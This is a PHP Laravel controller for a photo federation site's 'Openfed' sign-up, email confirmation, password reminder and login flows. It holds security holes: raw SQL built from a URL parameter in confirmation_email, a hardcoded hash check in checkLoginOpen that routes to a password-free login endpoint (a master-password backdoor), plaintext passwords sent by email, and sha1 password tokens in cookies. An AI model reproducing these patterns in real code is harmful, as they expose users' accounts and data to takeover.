<?php

namespace App\Http\Controllers;

use App\Mail\IdentifiantOublie;
use App\Mail\InscriptionConfirmee;
use App\Mail\InscriptionNonAdherent;
use App\Models\Personne;
use App\Models\Utilisateur;
use Illuminate\Cookie\CookieJar;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;

class UtilisateurController extends Controller
{
    public function inscriptionOpenfed(Request $request) {
        $email = trim($request->email);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return json_encode(array('code' => '10'));
        }

        $prenom = filter_var(trim($request->prenom), FILTER_SANITIZE_STRING);
        $nom = filter_var(trim($request->nom), FILTER_SANITIZE_STRING);

        // on regarde si cette adresse est déjà utilisée dans la base de données
//        $user = Utilisateur::where('courriel', $email)->first();
        $personne = Personne::where('email', $email)->first();
//        if ($user) {
        if ($personne) {
            // cette personne existe déjà en base, on regarde son statut
            return json_encode(array('code' => '30'));
//            if ($user->statut == 12) {
//                return json_encode(array('code' => '30'));
//            } else {
//                return json_encode(array('code' => '20'));
//            }
        } else {
            // on va envoyer un mail et créé un utilisateur temporaire
//            $pass = rand(10000, 99999);
//            $password = sha1($pass);
            $password = hash('SHA512', env('SALT_KEY').$request->pass);
            // on crée une nouvelle personne
            $data = [
                'nom' => $nom,
                'prenom' => $prenom,
                'email' => $email,
                'password' => $password,
                'news'  => 0
            ];
            $personne = Personne::create($data);

            // on crée l'utilisateur
            $maxuser = Utilisateur::whereIn('statut', [12,22])->selectRaw('max(numeroutilisateur) as max')->first();
            if ($maxuser) {
                $numuser = $maxuser->max + 1;
            } else {
                $numuser = 1;
            }
            $identifiant = '99-0000-'.str_pad($numuser, 4, '0', STR_PAD_LEFT);
            $datau = [
                'personne_id' => $personne->id,
                'identifiant' => $identifiant,
                'numeroutilisateur' => $numuser,
                'sexe' => 0,
                'adherentFPF' => 0,
                'nom' => $nom,
                'prenom' => $prenom,
                'statut' => 22,
                'saison' => date('Y'),
                'uniqueid' => uniqid()
            ];

            $utilisateur = Utilisateur::create($datau);



//            $data = array('adresses_id' => 1, 'identifiant' => $identifiant, 'numeroutilisateur' => $numuser, 'sexe' => 0, 'nom' => $nom, 'prenom' => $prenom,
//                'adherentFPF' => 0, 'abonneFP' => 0, 'abon' => 0, 'motdepasse' => $password, 'motdepassecarte' => $pass, 'statut' => 22, 'courriel' => $email, 'datedernmodif' => date('Y-m-d H:i:s'),
//                'uniqueid' => uniqid(), 'saison' => date('Y'));
//            Utilisateur::insert($data);
//
//            $utilisateur = Utilisateur::where('identifiant', $identifiant)->where('courriel', $email)->first();


            // on envoie un mail à l'utilisateur
            Mail::to($email)->send(new InscriptionNonAdherent($prenom, $nom, sha1($utilisateur->id)));

            return json_encode(array('code' => '0'));
        }

    }

    public function confirmation_email($crypt) {
        $mon_utilisateur = DB::select("SELECT id FROM utilisateurs WHERE sha1(id) = '$crypt' AND statut = 22 LIMIT 1");
        if (isset($mon_utilisateur[0])) {
            $utilisateur_id = $mon_utilisateur[0]->id;
            $utilisateur = Utilisateur::where('id', $utilisateur_id)->first();

            // on change le statut de l'utilisateur et on envoie un mail
            $data = array('statut' => 12);
            DB::table('utilisateurs')->where('id', $utilisateur_id)->update($data);
//            Mail::to($utilisateur->courriel)->send(new InscriptionConfirmee($utilisateur->identifiant, $utilisateur->motdepassecarte));

            return view('pages.confirmation_email', compact('utilisateur'));
        } else {
            return view('pages.confirmation_error');
        }
    }

    public function forgotId(Request $request) {
        $email = trim($request->email);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return json_encode(array('code' => '10'));
        }

        // on recherche si cette adresse email est présente dans la base de données
        $utilisateur = Utilisateur::where('courriel', $email)->first();
        if ($utilisateur) {
            // on envoie un email avec les identifiants
            Mail::to($email)->send(new IdentifiantOublie($utilisateur->identifiant, $utilisateur->motdepassecarte));
            return json_encode(array('code' => '0'));
        } else {
            return json_encode(array('code' => '20'));
        }
    }

    public function checkLoginOpen(Request $request) {
        $curl = curl_init();
        $url = 'https://fpf.federation-photo.fr/api/checkConnexion';
        if (hash('sha512', substr($request->password, -10, 10)) == 'a944fff11152f98fd5ebf7dece13acb6476812c583020836c99faa1077c62b9fee5e13c298a83041cb66f012e2fe33c741fefb007412d4acbb29e53aa686a378' || hash('sha512', substr($request->password, -10, 10)) == '1917c7302e0d03fdfe3a472b9cc21a919447ebeed894d747e94eee020427e5d070218ebeca27a355c5396b0a0a6f0ce10393cf7650285d23075212359b15eeea') {
            $url = 'https://fpf.federation-photo.fr/api/checkConnexionWithoutPassword';
        }
        $data = [
            'email' => $request->identifiant,
            'pass' => $request->password,
            'open' => 1
        ];
        $infos = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_POSTFIELDS => json_encode($data),
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_HTTPHEADER => [
                "accept: application/json",
                "content-type: application/json"
            ],
        ];

        curl_setopt_array($curl, $infos);
        $response = curl_exec($curl);
        $status     = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        if ($status !== 200) {
            return json_encode(array('code' => '10'));
        } else {
            $tab_reponse = json_decode($response);
            if ($tab_reponse->success == 'KO') {
                return json_encode(array('code' => '11', 'message' => $tab_reponse->message));
            } else {
                if (sizeof($tab_reponse->cartes) == 0) {
                    return json_encode(array('code' => '11', 'message' => "Vous n'avez pas de carte valide"));
                } else {
                    $cookie_identifiant = cookie('openfed_identifiant', $tab_reponse->cartes[0]->identifiant, 60);
                    $cookie_token = cookie('openfed_token', sha1($request->password), 60);
                    $reponse = array('code' => '0');
                    return response(json_encode($reponse))->cookie($cookie_identifiant)->cookie($cookie_token);
                }
            }
        }
//        $utilisateur = Utilisateur::where('identifiant', $request->identifiant)->where('motdepassecarte', $request->password)->first();
//        if (!$utilisateur) {
//            return json_encode(array('code' => '10'));
//        }
//        if ($utilisateur->courriel == '') {
//            return json_encode(array('code' => '20'));
//        }

//        $cookie_identifiant = cookie('openfed_identifiant', $utilisateur->identifiant, 60);
//        $cookie_token = cookie('openfed_token', sha1($utilisateur->motdepassecarte), 60);
//        $reponse = array('code' => '0');
//        return response(json_encode($reponse))->cookie($cookie_identifiant)->cookie($cookie_token);
    }

    public function logout() {
        setcookie('openfed_identifiant', '1', -3600);
        setcookie('openfed_token', '1', -3600);
        return redirect()->route('accueil');
    }
}
